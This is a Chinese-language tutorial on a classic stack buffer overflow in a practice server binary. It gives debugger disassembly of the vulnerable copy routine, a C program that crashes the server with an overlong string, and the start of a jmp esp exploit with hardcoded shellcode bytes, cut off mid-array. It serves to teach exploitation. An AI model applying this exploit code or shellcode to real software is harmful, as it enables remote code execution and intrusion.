
# 漏洞分析

> 0040122F  |.  E8 F3010000  |call    00401427  
> 00401234  |.  68 D0124000   |push    004012D0  
> 00401239  |.  6A 0A         |push    0A                         ;  /Arg1 = 0000000A  
> 0040123B  |.  8BC8          |mov     ecx, eax                   ;  |  
> 0040123D  |.  E8 9E000000   |call    004012E0                   ;  \\exploit\_.004012E0  
> 00401242  |.  8BC8          |mov     ecx, eax  
> 00401244  |.  E8 67000000   |call    004012B0  
> 00401249  |.  33F6          |xor     esi, esi  
> 0040124B  |>  8D5424 34     |lea     edx, dword ptr [esp+34]    ;  取接收到的字符串地址  
> 0040124F  |.  52            |push    edx  
> 00401250  |.  E8 ABFDFFFF   |call    00401000              ;  这里返回时 eip 被覆盖  

我们发现 实际上是基本的网络程序 C/S 模型的服务端 框架 ，主要功能 开一端口 7777，监听，接收数据。

在这段代码中，在 `recv` 处 有字符串复制操作 ，并且一次接收的字符串 为 0x200 也就是 512 字节。

下面我们就尝试让程序溢出崩溃。

用 vc 写一测试代码

主要就是用网络函数 `connect()`   `send()` 向 目标程序发送过长字符串。

测试代码如下，一个很简单的发送字符串的代码：

```c
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
int main()
{
  char buffer[1000]=
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  WSADATA wsa;
  WSAStartup(MAKEWORD(2,0),&wsa);
  SOCKET s,s1;
  struct sockaddr_in target;
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=inet_addr("127.0.0.1");
  target.sin_port=htons(7777);
  s=socket(AF_INET,SOCK_STREAM,0);
  connect(s,(struct sockaddr *)&target,sizeof(target));
  Sleep(1000);
  send(s,buffer,sizeof(buffer),0);  //发送字符串
  Sleep(1000);
  WSACleanup();
  return 1;
}
```

我们先运行 `exploit_me_A.exe`

然后运行我们的测试程序，这时 `exploitme_me_A.exe` 显示如下：

![名称:  1.jpg> 查看次数: 150> 文件大小:  53.4 KB](img/1e3b09aaeebfa663646f49ff5b5171dd.jpg)

很显然 `exploitme_me_A.exe` 在打印完我们输入的串后，在某处 eip 被串覆盖。

好了现在我们要做的几就是找到 eip 被覆盖的地方，在这里填上一跳转指令的地址，改跳转指令负责跳到我们的 shellcode 的地方去，然后就大功告成了。

再用 od 加载目标程序 我们在 `recv` 函数下面

00401223  |.  7D 26         |jge     short 0040124B  
这条指令的地方下断，该处指令意思很明显,如果 `recv` 函数执行失败，则打印错误消息否则继续到 40124b 出执行。

我们下断后按下 F9 目标程序 处于监听，等待接收状态。

这时 运行我们的测试程序，od 断下。

![名称:  2.jpg> 查看次数: 147> 文件大小:  13.3 KB](img/48e2b852b2cf5c7b755028764e467e24.jpg)

我们单步 f8，当执行完 `call 401000` 时  

目标程序崩溃。这里意思很明显了，多半是 `call` 执行完 返回时，返回地址被覆盖。

我们重新加载 od 重复上面步骤 到 `call 401000` 时 f7 跟进去

相关代码及主要部分分析如下：

```
00401000  /$  81EC C8000000  sub     esp, 0C8                    ;  分配 200 字节栈空间
00401006  |.  83C9 FF       or      ecx, FFFFFFFF
00401009  |.  33C0          xor     eax, eax
0040100B  |.  8D5424 00     lea     edx, dword ptr [esp]
0040100F  |.  56            push    esi                         ;  512
00401010  |.  57            push    edi                         ;
00401011  |.  8BBC24 D40000>mov     edi, dword ptr [esp+D4]     ;  edi 指向我们发送的串
00401018  |.  68 4C904000   push    0040904C                    ;  ASCII "****************"
0040101D  |.  F2:AE         repne   scas byte ptr es:[edi]
0040101F  |.  F7D1          not     ecx                         ;  获得串长度
00401021  |.  2BF9          sub     edi, ecx                    ;  edi 指向串头
00401023  |.  8BC1          mov     eax, ecx
00401025  |.  8BF7          mov     esi, edi
00401027  |.  8BFA          mov     edi, edx
00401029  |.  C1E9 02       shr     ecx, 2                      ;
0040102C  |.  F3:A5         rep     movs dword ptr es:[edi], dw>;  把串复制到分配的栈空间里共复制了 132*4 字节，超出了 200 字节，这里把该函数的返回地址覆盖了。
0040102E  |.  8BC8          mov     ecx, eax
00401030  |.  83E1 03       and     ecx, 3                      ;
00401033  |.  F3:A4         rep     movs byte ptr es:[edi], byt>
00401035  |.  B9 689A4000   mov     ecx, 00409A68
0040103A  |.  E8 E8030000   call    00401427
0040103F  |.  68 D0124000   push    004012D0
00401044  |.  6A 0A         push    0A                         ; /Arg1 = 0000000A
00401046  |.  8BC8          mov     ecx, eax                    ; |
00401048  |.  E8 93020000   call    004012E0                    ; \\exploit\_.004012E0
0040104D  |.  8BC8          mov     ecx, eax
0040104F  |.  E8 5C020000   call    004012B0
00401054  |.  68 40904000   push    00409040                    ;  ASCII "received:"
00401059  |.  B9 689A4000   mov     ecx, 00409A68
0040105E  |.  E8 C4030000   call    00401427
00401063  |.  68 D0124000   push    004012D0
00401068  |.  6A 0A         push    0A                         ; /Arg1 = 0000000A
0040106A  |.  8BC8          mov     ecx, eax                    ; |
0040106C  |.  E8 6F020000   call    004012E0                    ; \\exploit\_.004012E0
00401071  |.  8BC8          mov     ecx, eax
00401073  |.  E8 38020000   call    004012B0
00401078  |.  8D4C24 08     lea     ecx, dword ptr [esp+8]
0040107C  |.  51            push    ecx
0040107D  |.  B9 689A4000   mov     ecx, 00409A68
00401082  |.  E8 A0030000   call    00401427                    ;  打印串
00401087  |.  68 D0124000   push    004012D0
0040108C  |.  6A 0A         push    0A                         ; /Arg1 = 0000000A
0040108E  |.  8BC8          mov     ecx, eax                    ; |
00401090  |.  E8 4B020000   call    004012E0                    ; \\exploit\_.004012E0
00401095  |.  8BC8          mov     ecx, eax
00401097  |.  E8 14020000   call    004012B0
0040109C  |.  5F            pop     edi
0040109D  |.  5E            pop     esi
0040109E  |.  81C4 C8000000 add     esp, 0C8                    ;  esp 想栈底移动 200 字节
004010A4  \.  C3            retn                                ;  返回执行 esp 所指指令
```

好了，我们明白了在 字符串 200 字节后面就是 `call 401000` 函数的返回地址，我们的 exploit 也就马上可以写出来了，把跳转指令跟在 200 个字符后，再放上 shellcode，就 ok 了。（这里是一般的 `jmp esp` 的方法，问题是可能找不到一个比较通用的跳转地址，我继续把这种利用方式描述完，之后再描述另一种更通用的利用方式。）

我们的跳转指令就选 `jmp esp` ，当返回指令被 `jmp esp` 地址覆盖，当子函数执行 `retn` 时要跳去执行 `jmp esp` 这个指令 同时 `esp` 往下移动 4 字节就指向我们 shellcode 了，这时后 `jmp esp` 就 jump 到了我们 shellcode 指令处了。

我们的 exploit 代码如下：

```c
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#define jump_addr "\\xd8\\x69\\x83\\x7c"  
char shellcode[]=
"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C"
"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53"
"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B"
"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95"
"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59"
"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A"
"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75"
"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03"
"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB"
```
